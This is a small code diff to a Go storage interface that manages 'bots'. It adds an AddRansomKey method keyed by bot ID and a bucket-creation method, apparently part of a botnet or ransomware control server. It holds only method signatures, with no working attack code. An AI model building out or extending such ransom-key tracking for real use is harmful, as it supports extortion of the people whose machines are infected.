@@ -6,4 +6,6 @@ type Storage interface {
 	RemoveBot(id []byte) error
 	ListBots() ([]*Bot, error)
 	GetBot(id []byte) (*Bot, error)
+	AddRansomKey(botID, key []byte) error
+	CreateBuckets() error
 }
